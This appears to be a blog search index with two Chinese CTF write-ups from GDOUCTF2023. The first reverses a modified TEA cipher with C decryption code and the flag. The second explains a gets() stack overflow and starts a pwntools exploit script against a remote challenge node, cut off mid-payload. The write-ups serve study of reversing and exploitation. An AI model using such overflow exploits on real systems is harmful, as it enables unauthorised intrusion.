<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>GDOUCTF2023-Tea</title>
      <link href="/2023/0469aeefb8.html"/>
      <url>/2023/0469aeefb8.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><code>tea</code> 算法的加密解密</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）GDOUCTF2023-Tea</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到一个 <code>teaaaa.exe</code> 程序，试运行：<br><img src="https://s2.loli.net/2023/04/21/WiQNjpoEvRUb6C5.png" alt="2023GDOUCTF-tea1.png"><br>给出了提示，让我们输入十六进制数据来获得 flag</p></li><li><p>用 64 位 IDA 打开，由于没有 <code>main()</code> 函数，查看字符串：<br><img src="https://s2.loli.net/2023/04/21/ocJCUdzjfRnNEu1.png" alt="2023GDOUCTF-tea2.png"><br>可以看到上面是程序的输出<br>注意到下面有一句提示：<code>fault!\nYou can go online and learn the tea algorithm!</code><br>定位过去，在 <code>sub_140016230()</code> 函数中：<br><img src="https://s2.loli.net/2023/04/21/2UZy5wNsu8JeAkP.png" alt="2023GDOUCTF-tea3.png"><br>观察形式，<code>v6</code> 的值决定了用户的输入是否正确，跟进一下 <code>sub_140011352(v8)</code> 函数，发现 <code>sub_140011352(v8)</code> 会执行 <code>sub_140011B60(a1)</code> 函数：<br><img src="https://s2.loli.net/2023/04/21/cqvVnoRALGJWTul.png" alt="2023GDOUCTF-tea4.png"><br>后面的一个 <code>for</code> 循环用来校验 <code>*(a1 + 4 * j)</code> 的值是否与 <code>v8[j]</code> 中的值相等<br>只有当每一个值都相同时，<code>v7</code> 才会一直保持非 0，于是返回一个非 0 值给 <code>v6</code>，就输入正确<br>（<strong>不过这里的逻辑貌似有点 bug，其实只需要 a1 的最后一个值与 v8 的最后一个值相等即可</strong>）<br>所以这其实是一个 <code>check()</code> 函数</p></li><li><p>注意到 <code>check</code> 失败的时候会提示我们去了解一下 <code>tea</code> 算法：</p></li></ol><blockquote><p>TEA 算法最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的。 TEA 算法使用 64 位的明文分组和 128 位的密钥，它使用 Feistel 分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了。</p><p>该算法使用了一个神秘常数 <code>δ（Delta）</code> 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 <code>δ（Delta）</code> 的精确值似乎并不重要，这里 TEA 把它定义为 <code>δ =「(√5 - 1)231」</code>（也就是程序中的 <code>0x9e3779b9</code>）</p></blockquote><ul><li>网上找的 <code>tea</code> 算法加解密源码如下：</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span><span class="token keyword">void</span> <span class="token function">tea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 进行32次迭代加密，Tea算法作者的建议迭代次数</span>    l <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>  <span class="token comment">// 累加Delta的值</span>    r <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>l <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 利用多次双位移和异或将明文与密钥扩散混乱，并将两个明文互相加密</span>  <span class="token punctuation">&#125;</span>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">;</span>  <span class="token comment">// 32次迭代累加后delta的值</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>l <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>    l <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x00010203</span><span class="token punctuation">,</span> <span class="token number">0x04050607</span><span class="token punctuation">,</span> <span class="token number">0x08090a0b</span><span class="token punctuation">,</span> <span class="token number">0x0c0d0e0f</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xaabbccdd</span><span class="token punctuation">,</span> <span class="token number">0x01234567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">tea_encrypt</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"tea_encrypt:%x %x\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"tea_decrypt:%x %x\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p><strong><code>tea</code> 算法最关键的是要找到 <code>δ（Delta）</code> 的值和 128 位的 <code>key</code></strong></p><p>在逆向程序的时候，可以利用 IDA 的插件 <code>Findcrypt</code> 识别 <code>tea</code> 算法（有时可能不成功）</p></blockquote><ol start="4"><li><p>回到 <code>sub_140016230()</code> 函数中，关键在 <code>if ( v6 )</code> 判断之前的这部分：<br><img src="https://s2.loli.net/2023/04/21/iQKwdCgjSAtYFD3.png" alt="2023GDOUCTF-tea5.png"><br>① 根据形式和程序的输出，<code>sub_1400111FE(&quot;%x&quot;, &amp;v8[j])</code> 应该是一个 <code>scanf()</code> 函数，让用户输入十六进制的数据，共需要输入 10 个<br>② 初始时：<br><code>v7[0] = 1234</code><br><code>v7[1] = 5678</code><br><code>v7[2] = 9012</code><br><code>v7[3] = 3456</code><br>③ 后面的 <code>sub_140011339(v7)</code> 函数会调用 <code>sub_1400117D0(a1)</code> 函数，改变了 <code>v7</code> 中的值：<br><img src="https://s2.loli.net/2023/04/21/Dbt9HpaTXkSdiev.png" alt="2023GDOUCTF-tea6.png"><br>④ 修改后：<br><code>v7[0] = 2233</code><br><code>v7[1] = 4455</code><br><code>v7[2] = 6677</code><br><code>v7[3] = 8899</code></p></li><li><p>函数 <code>sub_140011145(v8, v9)</code> 会调用 <code>sub_140012030(a1, a2)</code> 实现 <code>v8</code> 往 <code>v9</code> 复制的操作，但是注意到后面并没有用到 <code>v9</code>，于是不管</p></li><li><p>跟进 <code>sub_1400112B7(v8, v7)</code> 函数，会执行 <code>sub_140011900(a1, a2)</code>：<br><img src="https://s2.loli.net/2023/04/21/eX9UyER8THZILuj.png" alt="2023GDOUCTF-tea7.png"><br>根据前面的了解，这个应该就是 <code>tea</code> 算法的实现了</p></li><li><p><strong>接下来重点就是要找出 <code>tea</code> 算法中  <code>δ（Delta）</code> 的值和 128 位的 <code>key</code>，以及密文了</strong><br>① 前面通过 <code>check()</code> 函数可知，check 是将用户输入与这一段数据进行校验：<br><img src="https://s2.loli.net/2023/04/21/vJU9EV5bQItRCfO.png" alt="2023GDOUCTF-tea8.png"><br>那么这些数据肯定就是 <code>tea</code> 算法加密后的密文了<br>② 注意实现 <code>tea</code> 算法的函数 <code>sub_1400112B7(v8, v7)</code> 的传参是 <code>v7</code> 和 <code>v8</code><br>而 <code>v8</code> 是用户的输入，也就是明文，那剩下的一个 <code>v7</code> 必然就是加密的 <code>key</code> 了：<br><code>v7[0] = 2233</code><br><code>v7[1] = 4455</code><br><code>v7[2] = 6677</code><br><code>v7[3] = 8899</code><br>每个 <code>v7[]</code> 有 32 位，四个正好 128 位<br>③ 最后，注意到 <code>tea</code> 算法的加密过程会有一个操作是： <code>sum += DELTA</code> 累加 <code>Delta</code> 的值<br>结合 IDA 给出的伪代码，<code>Delta = 256256256</code></p></li><li><p>剩下的就是根据逻辑写出解密的脚本了<br>形式好像跟网上介绍的 <code>tea</code> 算法不一样，可能有魔改，直接用原版貌似跑不出来<br>所以可以<em>直接基于 IDA 的伪代码进行改写</em></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">256256256</span>  </span></span>  <span class="token keyword">void</span> <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v7 <span class="token operator">=</span> <span class="token number">4455</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v8 <span class="token operator">=</span> <span class="token number">6677</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v9 <span class="token operator">=</span> <span class="token number">8899</span><span class="token punctuation">;</span>      <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v5<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v3<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          v6 <span class="token operator">=</span> <span class="token number">256256256</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v3 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>              <span class="token operator">++</span>v5<span class="token punctuation">;</span>              a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> a2<span class="token punctuation">[</span><span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                                                           <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> v6 <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> a2<span class="token punctuation">[</span>v6 <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                v6 <span class="token operator">-=</span> <span class="token number">256256256</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x20</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v5 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v9<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v9<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v9<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// v7存放密钥key  </span>    v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5678</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9012</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3456</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// v8存放密文  </span>    v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">444599258</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">140107365</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1226314200</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">234802392</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">359413339</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1013885656</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2066432216</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">249921817</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">856928850</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">576724359</span><span class="token punctuation">;</span>        <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 先修改v7的值  </span>    <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// tea的解密算法  </span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 输出明文  </span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> m <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>m<span class="token punctuation">)</span>              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{hzCtf_94_re666fingcry5641qq}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote><p><img src="https://s2.loli.net/2023/04/21/VW1U3hTnuKLlyBz.png" alt="2023GDOUCTF-tea9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF2023-EASY_PWN</title>
      <link href="/2023/04634ef444.html"/>
      <url>/2023/04634ef444.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>比较经典的栈溢出，但是<mark>不要被前面的猜随机数迷惑了，直接溢出修改关键值</mark></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）GDOUCTF2023-EASY_PWN</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>在 Ubuntu 下分析文件，并给予执行权限运行：<br><img src="https://s2.loli.net/2023/04/20/B5v3tEmRPWLNCS4.png" alt="2023GDOUCTF-EASY_PWN1.png"></p></li><li><p>用 64 位 IDA 打开，定位到主函数：<br><img src="https://s2.loli.net/2023/04/20/BIpndYOKqZXzghV.png" alt="2023GDOUCTF-EASY_PWN2.png"><br>主要是函数 <code>check()</code>：<br><img src="https://s2.loli.net/2023/04/20/q2IMvw4NKVnlO8C.png" alt="2023GDOUCTF-EASY_PWN3.png"></p></li><li><p>注意到有个 <code>print_flag()</code> 函数：<br><img src="https://s2.loli.net/2023/04/20/XrsKwjOPl5zoxTZ.png" alt="2023GDOUCTF-EASY_PWN4.png"><br>这个函数读取了靶机上的 <code>flag.txt</code> 文件，并将里面的内容输出，因此执行这个函数可以直接获得 <code>flag</code></p></li><li><p>在 <code>check()</code> 函数的前半段有一个生成随机数的代码：<br><img src="https://s2.loli.net/2023/04/20/UqIY2um37hkKf8j.png" alt="2023GDOUCTF-EASY_PWN5.png"><br>这里调用 <code>urandom</code> 文件往 <code>buf</code> 中写入随机数<br>然后通过 <code>gets()</code> 获取用户输入 <code>s1</code>，如果 <code>s1</code> 与 随机生成的 <code>buf</code> 相等，就将 <code>v5</code> 的值改为 1<br>当 <code>v5 == 1</code> 时就可以调用 <code>print_flag()</code> 函数输出 flag</p></li><li><p>由于这里输入使用的是 <code>gets()</code> 函数，也就是说 <code>s1</code> 是必定可以溢出的<br><img src="https://s2.loli.net/2023/04/20/V18DsJRo6kM5QAx.png" alt="2023GDOUCTF-EASY_PWN6.png"><br>观察栈中数据的位置，发现 <code>v5</code> 在 <code>s1</code> 的下方，因此 <code>v5</code> 是可以被 <code>s1</code> 通过 <code>gets()</code> 覆盖的</p></li></ol><blockquote><p>这里注意：<br><strong>不要被前面的猜随机数给迷惑了</strong><br><strong>是否执行 <code>print_flag()</code> 函数取决于 <code>v5</code> 的值是否非 0，而与是否猜对 <code>buf</code> 中的内容无关</strong><br><strong>因此大可不必去管 <code>urandom</code> 生成的随机数是什么</strong></p></blockquote><ol start="6"><li><p>除此之外，通过 <code>s1</code> 直接覆盖返回值执行 <code>print_flag()</code> 函数也是可以的</p></li><li><p>因此这个题有两种思路：<br>① 通过溢出 <code>s1</code> 修改 <code>v5</code> 的值，只要将 <code>v5</code> 改为非 0 值即可<br>② 通过溢出 <code>s1</code> 修改函数返回地址，使其直接跳转到 <code>print_flag()</code> 函数</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><ul><li>将 v5 的值修改为 1（或者其他非 0 值都可以）</li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28291</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1F</span> <span class="token operator">-</span> <span class="token number">0x04</span><span class="token 